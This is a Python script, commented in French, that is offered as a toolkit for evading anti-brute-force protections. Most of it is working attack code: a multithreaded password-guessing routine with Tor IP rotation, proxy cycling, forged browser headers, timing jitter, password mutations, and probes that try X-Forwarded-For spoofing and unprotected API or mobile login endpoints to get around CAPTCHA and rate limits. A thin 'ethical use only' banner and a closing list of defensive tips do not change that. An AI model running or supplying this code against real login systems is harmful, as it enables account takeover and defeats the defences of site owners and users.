#!/usr/bin/env python3
"""
Techniques d'évasion pour contourner les protections anti-brute force
À UTILISER UNIQUEMENT POUR TESTER VOS PROPRES SYSTÈMES !
"""

import requests
import time
import random
import json
import socket
import socks
from stem import Signal
from stem.control import Controller
import threading
from faker import Faker
import string
from datetime import datetime
import base64

class EvasionTechniques:
    def __init__(self, target_url):
        self.target_url = target_url
        self.fake = Faker()
        self.session_pool = []
        self.proxy_list = []
        self.current_proxy_index = 0
        
        # Configuration Tor (optionnel)
        self.tor_enabled = False
        self.tor_config = {
            'socks_port': 9050,
            'control_port': 9051,
            'password': 'your_tor_password'
        }
    
    def setup_tor(self):
        """Configure l'utilisation de Tor pour l'anonymisation"""
        try:
            # Configurer le proxy SOCKS
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", self.tor_config['socks_port'])
            socket.socket = socks.socksocket
            
            # Tester la connexion
            response = requests.get('http://httpbin.org/ip')
            print(f"[+] Tor activé. IP actuelle: {response.json()['origin']}")
            
            self.tor_enabled = True
            return True
        except Exception as e:
            print(f"[-] Impossible d'activer Tor: {e}")
            return False
    
    def rotate_tor_identity(self):
        """Change l'identité Tor (nouvelle IP)"""
        if not self.tor_enabled:
            return False
        
        try:
            with Controller.from_port(port=self.tor_config['control_port']) as controller:
                controller.authenticate(password=self.tor_config['password'])
                controller.signal(Signal.NEWNYM)
                time.sleep(5)  # Attendre que le circuit change
                
                # Vérifier la nouvelle IP
                response = requests.get('http://httpbin.org/ip')
                print(f"[+] Nouvelle identité Tor: {response.json()['origin']}")
                return True
        except Exception as e:
            print(f"[-] Erreur rotation Tor: {e}")
            return False
    
    def load_proxy_list(self, proxy_file=None):
        """Charge une liste de proxies"""
        if proxy_file:
            try:
                with open(proxy_file, 'r') as f:
                    self.proxy_list = [line.strip() for line in f.readlines()]
                print(f"[+] {len(self.proxy_list)} proxies chargés")
            except:
                print("[-] Erreur chargement des proxies")
        else:
            # Proxies de test (remplacer par de vrais proxies)
            self.proxy_list = [
                'http://proxy1.example.com:8080',
                'http://proxy2.example.com:8080',
                'socks5://proxy3.example.com:1080'
            ]
    
    def get_next_proxy(self):
        """Retourne le prochain proxy de la liste"""
        if not self.proxy_list:
            return None
        
        proxy = self.proxy_list[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxy_list)
        
        return {'http': proxy, 'https': proxy}
    
    def generate_realistic_headers(self):
        """Génère des headers HTTP réalistes et variés"""
        browsers = [
            ('Chrome', '91.0.4472.124'),
            ('Firefox', '89.0'),
            ('Safari', '14.1.1'),
            ('Edge', '91.0.864.59')
        ]
        
        os_list = [
            'Windows NT 10.0; Win64; x64',
            'Macintosh; Intel Mac OS X 10_15_7',
            'X11; Linux x86_64',
            'X11; Ubuntu; Linux x86_64'
        ]
        
        browser, version = random.choice(browsers)
        os_string = random.choice(os_list)
        
        if browser == 'Chrome':
            ua = f'Mozilla/5.0 ({os_string}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Safari/537.36'
        elif browser == 'Firefox':
            ua = f'Mozilla/5.0 ({os_string}; rv:{version}) Gecko/20100101 Firefox/{version}'
        elif browser == 'Safari':
            ua = f'Mozilla/5.0 ({os_string}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Safari/605.1.15'
        else:
            ua = f'Mozilla/5.0 ({os_string}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Safari/537.36 Edg/{version}'
        
        headers = {
            'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'fr-FR,fr;q=0.9', 'es-ES,es;q=0.9']),
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': random.choice(['1', None]),
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        }
        
        # Ajouter des headers aléatoires parfois
        if random.random() > 0.5:
            headers['Referer'] = f'https://www.google.com/search?q={self.fake.word()}'
        
        # Nettoyer les None
        return {k: v for k, v in headers.items() if v is not None}
    
    def create_session_pool(self, size=10):
        """Crée un pool de sessions avec différentes caractéristiques"""
        print(f"[*] Création d'un pool de {size} sessions...")
        
        for i in range(size):
            session = requests.Session()
            session.verify = False
            
            # Headers uniques pour chaque session
            session.headers.update(self.generate_realistic_headers())
            
            # Cookies aléatoires (simule une navigation préalable)
            if random.random() > 0.5:
                session.cookies.set(
                    f'session_{i}',
                    self.fake.sha256(),
                    domain=self.target_url.split('/')[2]
                )
            
            self.session_pool.append(session)
        
        print(f"[+] {len(self.session_pool)} sessions créées")
    
    def get_random_session(self):
        """Retourne une session aléatoire du pool"""
        if not self.session_pool:
            self.create_session_pool()
        return random.choice(self.session_pool)
    
    def timing_evasion(self, base_delay=1.0):
        """Génère des délais réalistes pour éviter la détection"""
        # Simuler un comportement humain
        techniques = {
            'gaussian': lambda: abs(random.gauss(base_delay, base_delay/3)),
            'exponential': lambda: random.expovariate(1/base_delay),
            'uniform': lambda: random.uniform(base_delay*0.5, base_delay*1.5),
            'human': lambda: base_delay + random.random() * 2 - 1
        }
        
        technique = random.choice(list(techniques.values()))
        delay = technique()
        
        # Ajouter occasionnellement des pauses plus longues (café, distraction)
        if random.random() < 0.05:  # 5% de chance
            delay += random.uniform(10, 30)
        
        return max(0.1, delay)  # Minimum 0.1 seconde
    
    def distributed_attack(self, login_function, credentials, threads=5):
        """
        Attaque distribuée utilisant plusieurs techniques d'évasion
        
        Args:
            login_function: Fonction qui tente un login (username, password) -> bool
            credentials: Liste de tuples (username, password)
            threads: Nombre de threads parallèles
        """
        print("[*] Lancement de l'attaque distribuée avec évasion...")
        
        # Créer le pool de sessions
        self.create_session_pool(threads * 2)
        
        # Statistiques
        stats = {
            'attempts': 0,
            'successes': 0,
            'blocked': 0,
            'errors': 0
        }
        lock = threading.Lock()
        
        def worker(cred_queue):
            while True:
                try:
                    username, password = cred_queue.get(timeout=1)
                except:
                    break
                
                # Sélectionner une technique d'évasion
                evasion_method = random.choice([
                    'session_rotation',
                    'proxy_rotation',
                    'header_variation',
                    'timing_variation'
                ])
                
                # Appliquer l'évasion
                session = self.get_random_session()
                
                if evasion_method == 'proxy_rotation' and self.proxy_list:
                    session.proxies = self.get_next_proxy()
                elif evasion_method == 'header_variation':
                    session.headers.update(self.generate_realistic_headers())
                
                # Délai intelligent
                delay = self.timing_evasion()
                time.sleep(delay)
                
                # Tentative de login
                try:
                    success = login_function(session, username, password)
                    
                    with lock:
                        stats['attempts'] += 1
                        if success:
                            stats['successes'] += 1
                            print(f"[+] Succès: {username}:{password}")
                        
                        # Afficher la progression
                        if stats['attempts'] % 10 == 0:
                            print(f"[*] Tentatives: {stats['attempts']}, "
                                  f"Succès: {stats['successes']}, "
                                  f"Bloqués: {stats['blocked']}")
                    
                except Exception as e:
                    with lock:
                        stats['errors'] += 1
                    
                    # Si bloqué, changer de stratégie
                    if '429' in str(e) or 'rate' in str(e).lower():
                        with lock:
                            stats['blocked'] += 1
                        
                        # Rotation d'IP si Tor est activé
                        if self.tor_enabled:
                            self.rotate_tor_identity()
        
        # Créer la queue et les threads
        import queue
        cred_queue = queue.Queue()
        for cred in credentials:
            cred_queue.put(cred)
        
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker, args=(cred_queue,))
            t.start()
            threads_list.append(t)
        
        # Attendre la fin
        for t in threads_list:
            t.join()
        
        return stats
    
    def generate_mutations(self, base_password):
        """Génère des mutations d'un mot de passe"""
        mutations = [base_password]
        
        # Variations de casse
        mutations.append(base_password.lower())
        mutations.append(base_password.upper())
        mutations.append(base_password.capitalize())
        
        # Ajout de chiffres
        for i in range(10):
            mutations.append(f"{base_password}{i}")
            mutations.append(f"{i}{base_password}")
        
        # Ajout d'années
        current_year = datetime.now().year
        for year in range(current_year-5, current_year+1):
            mutations.append(f"{base_password}{year}")
        
        # Substitutions leetspeak
        leet_map = {'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$'}
        leet_password = base_password
        for char, leet in leet_map.items():
            leet_password = leet_password.replace(char, leet)
        if leet_password != base_password:
            mutations.append(leet_password)
        
        # Caractères spéciaux
        for char in ['!', '@', '#', '$', '*', '123']:
            mutations.append(f"{base_password}{char}")
        
        return list(set(mutations))
    
    def test_captcha_bypass(self, login_url):
        """Teste différentes techniques de contournement de CAPTCHA"""
        print("[*] Test de contournement CAPTCHA...")
        
        techniques = {
            'session_reuse': self._test_session_reuse,
            'rate_limit_bypass': self._test_rate_limit_bypass,
            'api_endpoint': self._test_api_endpoints,
            'mobile_endpoint': self._test_mobile_endpoints
        }
        
        results = {}
        for name, technique in techniques.items():
            print(f"[*] Test: {name}")
            success = technique(login_url)
            results[name] = success
            if success:
                print(f"[+] Technique {name} réussie!")
        
        return results
    
    def _test_session_reuse(self, login_url):
        """Teste la réutilisation de session pour éviter le CAPTCHA"""
        try:
            # Obtenir une session valide
            session = requests.Session()
            response = session.get(login_url)
            
            # Chercher des endpoints alternatifs sans CAPTCHA
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                if 'captcha' not in str(form).lower():
                    return True
            
            return False
        except:
            return False
    
    def _test_rate_limit_bypass(self, login_url):
        """Teste le contournement du rate limiting"""
        techniques = [
            {'X-Forwarded-For': self.fake.ipv4()},
            {'X-Real-IP': self.fake.ipv4()},
            {'X-Originating-IP': self.fake.ipv4()},
            {'X-Remote-IP': self.fake.ipv4()},
            {'X-Client-IP': self.fake.ipv4()}
        ]
        
        for headers in techniques:
            try:
                response = requests.get(login_url, headers=headers, timeout=5)
                if response.status_code == 200:
                    return True
            except:
                pass
        
        return False
    
    def _test_api_endpoints(self, base_url):
        """Cherche des endpoints API sans protection"""
        api_paths = [
            '/api/login', '/api/v1/login', '/api/auth',
            '/rest/login', '/rest/auth', '/mobile/login',
            '/app/login', '/ajax/login', '/json/login'
        ]
        
        for path in api_paths:
            try:
                url = base_url.rstrip('/') + path
                response = requests.post(
                    url,
                    json={'username': 'test', 'password': 'test'},
                    timeout=5
                )
                if response.status_code != 404:
                    return True
            except:
                pass
        
        return False
    
    def _test_mobile_endpoints(self, base_url):
        """Teste les endpoints mobiles souvent moins protégés"""
        mobile_headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15'
        }
        
        mobile_paths = ['/m/login', '/mobile/login', '/app/login']
        
        for path in mobile_paths:
            try:
                url = base_url.rstrip('/') + path
                response = requests.get(url, headers=mobile_headers, timeout=5)
                if response.status_code == 200 and 'captcha' not in response.text.lower():
                    return True
            except:
                pass
        
        return False


def demonstrate_evasion():
    """Démontre les techniques d'évasion"""
    print("\n" + "="*60)
    print("DÉMONSTRATION DES TECHNIQUES D'ÉVASION")
    print("="*60)
    
    target = input("\nURL cible (ex: http://localhost:5000): ")
    evasion = EvasionTechniques(target)
    
    print("\n[1] Configuration de base")
    print("-" * 30)
    
    # Générer des headers
    print("\n[*] Headers générés:")
    for i in range(3):
        headers = evasion.generate_realistic_headers()
        print(f"\nSet {i+1}:")
        for k, v in headers.items():
            print(f"  {k}: {v}")
    
    # Timing
    print("\n[*] Délais d'évasion (10 échantillons):")
    delays = [evasion.timing_evasion() for _ in range(10)]
    print(f"  Min: {min(delays):.2f}s, Max: {max(delays):.2f}s, Moy: {sum(delays)/len(delays):.2f}s")
    
    # Mutations de mot de passe
    print("\n[*] Mutations du mot de passe 'admin':")
    mutations = evasion.generate_mutations('admin')
    print(f"  {len(mutations)} variations générées")
    print(f"  Exemples: {mutations[:5]}")
    
    # Test CAPTCHA bypass
    if input("\n[?] Tester le contournement CAPTCHA? (o/n): ").lower() == 'o':
        login_url = input("URL de login: ")
        results = evasion.test_captcha_bypass(login_url)
        print("\n[*] Résultats des tests de contournement:")
        for technique, success in results.items():
            status = "✓" if success else "✗"
            print(f"  [{status}] {technique}")


if __name__ == "__main__":
    print("╔══════════════════════════════════════════════════╗")
    print("║   Techniques d'Évasion Anti-Brute Force v1.0    ║")
    print("╠══════════════════════════════════════════════════╣")
    print("║  ⚠️  USAGE ÉTHIQUE UNIQUEMENT !                   ║")
    print("║  Testez seulement VOS propres systèmes          ║")
    print("╚══════════════════════════════════════════════════╝")
    
    demonstrate_evasion()
    
    print("\n[*] Recommandations de protection:")
    print("- Implémenter un CAPTCHA robuste (reCAPTCHA v3)")
    print("- Utiliser le rate limiting par IP ET par compte")
    print("- Détecter les patterns d'attaque (ML/AI)")
    print("- Implémenter des honeypots")
    print("- Logger toutes les tentatives suspectes")
    print("- Utiliser la géolocalisation pour détecter les anomalies")
    print("- Implémenter une authentification adaptative")